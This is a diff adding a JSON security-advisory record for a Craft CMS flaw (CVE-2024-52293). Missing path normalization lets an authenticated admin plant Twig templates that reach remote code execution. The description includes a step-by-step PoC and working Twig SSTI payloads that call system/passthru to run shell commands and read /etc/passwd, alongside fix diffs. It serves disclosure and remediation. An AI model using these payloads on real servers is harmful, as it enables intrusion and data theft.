@@ -1,0 +1,62 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2024-11-13T14:16:39Z",
+  "Package": {
+    "Ecosystem": "COMPOSER",
+    "Name": "craftcms/cms"
+  },
+  "Advisory": {
+    "DatabaseId": 267451,
+    "Id": "GSA_kwCzR0hTQS1mM2N3LWhnNnItY2hmds4ABBS7",
+    "GhsaId": "GHSA-f3cw-hg6r-chfv",
+    "References": [
+      {
+        "Url": "https://github.com/craftcms/cms/security/advisories/GHSA-f3cw-hg6r-chfv"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52293"
+      },
+      {
+        "Url": "https://github.com/craftcms/cms/commit/123e48a696de1e2f63ab519d4730eb3b87beaa58"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-f3cw-hg6r-chfv"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-f3cw-hg6r-chfv"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2024-52293"
+      }
+    ],
+    "Description": "### Summary\n\nMissing `normalizePath` in the function `FileHelper::absolutePath` could lead to Remote Code Execution on the server via twig SSTI.\n\n`(Post-authentication, ALLOW_ADMIN_CHANGES=true)`\n\n### Details\n\nNote: This is a sequel to [CVE-2023-40035](https://github.com/craftcms/cms/security/advisories/GHSA-44wr-rmwq-3phw)\n\nIn [`src/helpers/FileHelper.php#L106-L137`](https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/helpers/FileHelper.php#L106-L137), the function `absolutePath` returned `$from . $ds . $to` without path normalization:\n\n```php\n/**\n * Returns an absolute path based on a source location or the current working directory.\n *\n * @param string $to The target path.\n * @param string|null $from The source location. Defaults to the current working directory.\n * @param string $ds the directory separator to be used in the normalized result. Defaults to `DIRECTORY_SEPARATOR`.\n * @return string\n * @since 4.3.5\n */\npublic static function absolutePath(\n    string $to,\n    ?string $from = null,\n    string $ds = DIRECTORY_SEPARATOR,\n): string {\n    $to = static::normalizePath($to, $ds);\n\n    // Already absolute?\n    if (\n        str_starts_with($to, $ds) ||\n        preg_match(sprintf('/^[A-Z]:%s/', preg_quote($ds, '/')), $to)\n    ) {\n        return $to;\n    }\n\n    if ($from === null) {\n        $from = FileHelper::normalizePath(getcwd(), $ds);\n    } else {\n        $from = static::absolutePath($from, ds: $ds);\n    }\n\n    return $from . $ds . $to;\n}\n```\n\nThis could leads to multiple security risks, one of them is in [`src/services/Security.php#L201-L220`](https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/services/Security.php#L201-L220) where `../templates/poc` is not considered a system dir.\n\nLet's see what happens after calling `isSystemDir(\"../templates/poc\")`:\n\n```php\n/**\n * Returns whether the given file path is located within or above any system directories.\n *\n * @param string $path\n * @return bool\n * @since 5.4.2\n */\npublic function isSystemDir(string $path): bool // $path = \"../templates/poc\"\n{\n    $path = FileHelper::absolutePath($path, '/'); // $path = \"/var/www/html/web//../templates/poc\"\n\n    foreach (Craft::$app-\u003egetPath()-\u003egetSystemPaths() as $dir) {\n        $dir = FileHelper::absolutePath($dir, '/'); // $dir = \"/var/www/html/templates\"\n        if (str_starts_with(\"$path/\", \"$dir/\") || str_starts_with(\"$dir/\", \"$path/\")) { // if (false || false)\n            return true;\n        }\n    }\n\n    return false; // We're here!\n}\n```\n\nNow that the path `../templates/poc` can bypass `isSystemDir`, it will also bypass the function `validatePath` in [`src/fs/Local.php#L124-L136`](https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/fs/Local.php#L124-L136):\n```php\n/**\n * @param string $attribute\n * @param array|null $params\n * @param InlineValidator $validator\n * @return void\n * @since 4.4.6\n */\npublic function validatePath(string $attribute, ?array $params, InlineValidator $validator): void\n{\n    if (Craft::$app-\u003egetSecurity()-\u003eisSystemDir($this-\u003egetRootPath())) {\n        $validator-\u003eaddError($this, $attribute, Craft::t('app', 'Local filesystems cannot be located within or above system directories.'));\n    }\n}\n```\n\nWe can now create a Local filesystem within the system directories, particularly in `/var/www/html/templates/poc`\n\nThen create a new asset volume with that filesystem, upload a `poc.ttml` file with twig code and execute using a new route with template path `poc/poc.ttml`\n\nAlthough craftcms does sandbox twig ssti, the list in [src/web/twig/Extension.php#L180-L268](https://github.com/craftcms/cms/blob/5e56c6d168524ed02f0620c9bc1c9750f5b94e3b/src/web/twig/Extension.php#L180-L268) is still incomplete.\n\n\n```js\n{{['id'] has some 'system'}}\n{{['ls'] has every 'passthru'}}\n{{['cat /etc/passwd']|find('system')}}\n{{['id;pwd;ls -altr /']|find('passthru')}}\n```\n\nThese payloads still work, see [twigphp/Twig/src/Extension/CoreExtension.php#getFilters()](https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L196-L247) and [twigphp/Twig/src/Extension/CoreExtension.php#getOperators()](https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php#L291-L333) for more informations.\n\n### PoC\n\n1. Craft CMS was installed using https://craftcms.com/docs/4.x/installation.html#quick-start\n\n```sh\nmkdir craftcms \u0026\u0026 cd craftcms\nddev config --project-type=craftcms --docroot=web --create-docroot\nddev composer create -y --no-scripts \"craftcms/craft\"\nddev craft install\nphp craft setup/security-key\nddev start\n```\n\n\u003cimg width=\"1280\" alt=\"start\" src=\"https://github.com/user-attachments/assets/f8bcc22a-6ffd-40a5-81c6-c077fa4ce1d3\"\u003e\n\n2. Create a new filesystem with base path `../templates/poc`\n\n\u003cimg width=\"1280\" alt=\"filesystem\" src=\"https://github.com/user-attachments/assets/fe78e023-bd51-4fc1-a22e-dcfa5baf266b\"\u003e\n\nNotice that the `poc` directory was created\n\n\u003cimg width=\"167\" alt=\"dir\" src=\"https://github.com/user-attachments/assets/ccc45ce8-8555-4aae-ae48-320a630e7d79\"\u003e\n\n3. Create a new asset volume using the `poc` filesystem\n\n\u003cimg width=\"1280\" alt=\"asset\" src=\"https://github.com/user-attachments/assets/b5530766-11b4-4e45-ae58-82f81fc2db00\"\u003e\n\nUpload a `poc.ttml` file with RCE template code\n\n```js\n{{'\u003cpre\u003e'}}\n{{ 8*8 }}\n{{['id'] has some 'system'}}\n{{['ls'] has every 'passthru'}}\n{{['cat /etc/passwd']|find('system')}}\n{{['id;pwd;ls -altr /']|find('passthru')}}\n```\n\nNote: `find` was added to twig [last month](https://github.com/twigphp/Twig/commit/4e262511930e408e4c7eda07b1c977f2ea98575c). If you're running this poc on an older version of twig try removing the last 2 lines.\n\n\u003cimg width=\"1280\" alt=\"upload\" src=\"https://github.com/user-attachments/assets/63e65beb-2ede-4141-85d2-e7d21cd4b8ad\"\u003e\n\n![ttml](https://github.com/user-attachments/assets/9db8ca9b-25eb-4014-a7f5-4ece895b106d)\n\n4. Create a new route `*` with template `poc/poc.ttml`\n\n\u003cimg width=\"1280\" alt=\"route\" src=\"https://github.com/user-attachments/assets/b92d9340-b6a5-40d8-a8e8-ddab5cfc9f21\"\u003e\n\n5. This leads to Remote Code Execution on arbitrary route `/*`\n\n\u003cimg width=\"454\" alt=\"rce\" src=\"https://github.com/user-attachments/assets/19765f6c-1c28-4a0b-a89c-25f6f05ceca6\"\u003e\n\n### Remediation\n\n```diff\ndiff --git a/src/helpers/FileHelper.php b/src/helpers/FileHelper.php\nindex 0c2da884a7..ac23ce556a 100644\n--- a/src/helpers/FileHelper.php\n+++ b/src/helpers/FileHelper.php\n@@ -133,7 +133,7 @@ class FileHelper extends \\yii\\helpers\\FileHelper\n             $from = static::absolutePath($from, ds: $ds);\n         }\n\n-        return $from . $ds . $to;\n+        return FileHelper::normalizePath($from . $ds . $to);\n     }\n\n     /**\n```\n\n![fix_norm](https://github.com/user-attachments/assets/4c8e5b4f-6216-416c-87a1-9b9fae033971)\n\nSee [twigphp/Twig/src/Extension/CoreExtension.php](https://github.com/twigphp/Twig/blob/a3496d148b75e270065ed8f03758f7b09b3a9793/src/Extension/CoreExtension.php) for updated filters and operators, a possible fix could look like:\n\n```diff\ndiff --git a/src/web/twig/Extension.php b/src/web/twig/Extension.php\nindex efff2d2412..756f452f8b 100644\n--- a/src/web/twig/Extension.php\n+++ b/src/web/twig/Extension.php\n@@ -225,6 +225,9 @@ class Extension extends AbstractExtension implements GlobalsInterface\n             new TwigFilter('lcfirst', [$this, 'lcfirstFilter']),\n             new TwigFilter('literal', [$this, 'literalFilter']),\n             new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' =\u003e true]),\n+            new TwigFilter('find', [$this, 'find'], ['needs_environment' =\u003e true]),\n+            new TwigFilter('has some' =\u003e ['precedence' =\u003e 20, 'class' =\u003e HasSomeBinary::class, 'associativity' =\u003e ExpressionParser::OPERATOR_LEFT]),\n+            new TwigFilter('has every' =\u003e ['precedence' =\u003e 20, 'class' =\u003e HasEveryBinary::class, 'associativity' =\u003e ExpressionParser::OPERATOR_LEFT]),\n             new TwigFilter('markdown', [$this, 'markdownFilter'], ['is_safe' =\u003e ['html']]),\n             new TwigFilter('md', [$this, 'markdownFilter'], ['is_safe' =\u003e ['html']]),\n             new TwigFilter('merge', [$this, 'mergeFilter']),\n```\n\n![fix_ssti](https://github.com/user-attachments/assets/5d9ce9be-022b-4853-a5f9-688b247cc27c)\n\n### Impact\n\nTake control of vulnerable systems, Data exfiltrations, Malware execution, Pivoting, etc.\n\nAlthough the vulnerability is exploitable only in the authenticated users, configuration with `ALLOW_ADMIN_CHANGES=true`, there is still a potential security threat (Remote Code Execution)",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2024-11-13T14:16:38Z",
+    "Severity": "HIGH",
+    "Summary": "Craft CMS vulnerable to Potential Remote Code Execution via missing path normalization \u0026 Twig SSTI",
+    "UpdatedAt": "2025-07-16T21:01:42Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.2,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.4.3"
+      },
+      "VulnerableVersionRange": "\u003e= 5.0.0-RC1, \u003c= 5.4.2"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.12.2"
+      },
+      "VulnerableVersionRange": "\u003e= 4.0.0-RC1, \u003c= 4.12.1"
+    }
+  ]
+}
